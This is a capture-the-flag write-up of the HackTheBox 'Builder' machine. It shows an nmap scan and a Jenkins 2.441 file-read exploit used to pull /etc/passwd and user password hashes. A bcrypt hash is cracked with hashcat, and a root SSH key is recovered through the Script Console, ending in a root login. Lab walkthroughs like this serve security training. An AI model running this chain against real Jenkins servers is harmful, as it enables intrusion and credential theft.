---
title: "Builder"
date: 2025-06-20
categories:
  - HackTheBox
  - Linux
tags:
  - HackTheBox
  - Linux
---

# Builder

![](assets/Pasted%20image%2020250514234815.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 23:57 CEST
Nmap scan report for 10.10.11.10
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-robots.txt: 1 disallowed entry 
|_/
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.18)
Aggressive OS guesses: Linux 5.0 (98%), Linux 5.0 - 5.14 (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), OpenWrt 22.03 (Linux 5.10) (92%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   41.26 ms 10.10.14.1
2   ...
3   41.37 ms 10.10.11.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.72 seconds
```

Port `8080` has a Jenkins instance running version `2.441`.

![](assets/Pasted%20image%2020250515003134.png)

Searching for exploits, there is an LFI one.

![](assets/Pasted%20image%2020250515003203.png)

```shell
$ python 51993.py -u http://10.10.11.10:8080/ -p /etc/passwd
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

Now, we see that Jenkins has the path in `/var/jenkins_home` but we don't know what files to read.
Deploy Jenkins locally to see all the interesting files and their paths.

```shell
$ docker pull jenkins/jenkins:2.441
2.441: Pulling from jenkins/jenkins
1b13d4e1a46e: Pull complete 
a618211e3ec8: Pull complete 
9dc069cd1830: Pull complete 
Digest: sha256:6bb8ea0eda544dddee8b3794936bd239e77281d59cce0f76586fa2c262e056f8
Status: Downloaded newer image for jenkins/jenkins:2.441
docker.io/jenkins/jenkins:2.441

$ docker images                              
REPOSITORY        TAG       IMAGE ID       CREATED         SIZE
jenkins/jenkins   2.441     fb91cdedcf6c   16 months ago   474MB

$ docker run --rm -p 8080:8080 jenkins/jenkins:2.441           
Running from: /usr/share/jenkins/jenkins.war
...

*************************************************************
*************************************************************
*************************************************************

Jenkins initial setup is required. An admin user has been created and a password generated.
Please use the following password to proceed to installation:

e86d54dcc63f40b0af8440b05f2a6793

This may also be found at: /var/jenkins_home/secrets/initialAdminPassword

```

Browse the Jenkins site and enter the password to complete the installation and generate the files.

![](assets/Pasted%20image%2020250515164124.png)

Once installed, enter the container.

```shell
$ docker exec -it 87b87c16f877 /bin/sh
$ whoami
jenkins
$ env
JENKINS_HOME=/var/jenkins_home
JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental
HOSTNAME=87b87c16f877
HOME=/var/jenkins_home
JENKINS_UC=https://updates.jenkins.io
REF=/usr/share/jenkins/ref
TERM=xterm
JENKINS_VERSION=2.441
JENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
JENKINS_SLAVE_AGENT_PORT=50000
COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log
JAVA_HOME=/opt/java/openjdk
PWD=/
```

Inside `users` we find our newly created user and `users.xml` with the user path.

```shell
$ cat users.xml
<?xml version='1.1' encoding='UTF-8'?>
<hudson.model.UserIdMapper>
  <version>1</version>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>administrator</string>
      <string>administrator_3984506477770267804</string>
    </entry>
  </idToDirectoryNameMap>
</hudson.model.UserIdMapper>$ 
```

Knowing this path, we can enter the user's folder and read `config.xml` with the password.

```shell
$ cat config.xml
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>administrator</id>
  <fullName>asdf</fullName>
  <properties>
    <jenkins.console.ConsoleUrlProviderUserProperty/>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>4026dd2a6d770b27</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
      <flags/>
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$6EJPyIFRC3o7PO1O3/ezcenFFtpgbU57.sggFWDvzPwe6mgr0EhEC</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
  </properties>
</user>$ 
```

## Initial Access

Now, on the box.

```shell
$ python 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/users.xml          
<?xml version='1.1' encoding='UTF-8'?>
      <string>jennifer_12108429903186576833</string>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>jennifer</string>
  <version>1</version>
</hudson.model.UserIdMapper>
  </idToDirectoryNameMap>
<hudson.model.UserIdMapper>
    </entry>
```

And now `jennifer`'s xml

```shell
$ python 51993.py -u http://10.10.11.10:8080/ -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">
    <hudson.search.UserSearchProperty>
      <roles>
    <jenkins.security.seed.UserSeedProperty>
      </tokenStore>
    </hudson.search.UserSearchProperty>
      <timeZoneName></timeZoneName>
  <properties>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <flags/>
    <hudson.model.MyViewsProperty>
</user>
    </jenkins.security.ApiTokenProperty>
      <views>
        <string>authenticated</string>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">
<user>
          <name>all</name>
  <description></description>
      <emailAddress>jennifer@builder.htb</emailAddress>
      <collapsed/>
    </jenkins.security.seed.UserSeedProperty>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    </hudson.model.MyViewsProperty>
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
          <filterQueue>false</filterQueue>
    <jenkins.security.ApiTokenProperty>
      <primaryViewName></primaryViewName>
      </views>
    </hudson.model.TimeZoneProperty>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">
    </hudson.model.PaneStatusProperties>
    </hudson.tasks.Mailer_-UserProperty>
        <tokenList/>
    <jenkins.console.ConsoleUrlProviderUserProperty/>
        </hudson.model.AllView>
      <timestamp>1707318554385</timestamp>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
  </properties>
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <insensitiveSearch>true</insensitiveSearch>
          <properties class="hudson.model.View$PropertyList"/>
    <hudson.model.TimeZoneProperty>
        <hudson.model.AllView>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
      <providerId>default</providerId>
      </roles>
    </jenkins.security.LastGrantedAuthoritiesProperty>
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    <hudson.model.PaneStatusProperties>
<?xml version='1.1' encoding='UTF-8'?>
  <fullName>jennifer</fullName>
      <seed>6841d11dc1de101d</seed>
  <id>jennifer</id>
  <version>10</version>
      <tokenStore>
          <filterExecutors>false</filterExecutors>
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
```

Crack the password with `hashcat` using module `3200`:

```shell
$ hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz --force
...

$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess

```

We retrieve `jennifer:princess`, enter the username and password in Jenkins.

Inside `Management > Credentials`, we notice that there is a `root` user with an SSH key.

![](assets/Pasted%20image%2020250515211615.png)

Click on update and see the concealed credentials.

![](assets/Pasted%20image%2020250515214120.png)

Using Firefox's developer console, get the value.

![](assets/Pasted%20image%2020250515214153.png)

Go to Script Console.

![](assets/Pasted%20image%2020250515211746.png)

Using `hudson.util.Secret.decrypt`, get the SSH key.

![](assets/Pasted%20image%2020250515214245.png)

Put the key into an `id_rsa` file, set permissions to `600`, and enter the system as `root`.

```shell
$ ssh root@10.10.11.10 -i id_rsa 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Thu May 15 06:28:40 PM UTC 2025

  System load:              0.0
  Usage of /:               67.2% of 5.81GB
  Memory usage:             41%
  Swap usage:               0%
  Processes:                220
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.10
  IPv6 address for eth0:    dead:beef::250:56ff:fe94:ffd8


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 12 13:15:44 2024 from 10.10.14.40
root@builder:~# whoami
root
```

## Post Exploitation

Get the flag

```shell
root@builder:~# cat root.txt
73f92cd64712c975042efbe9d114d6ac
```
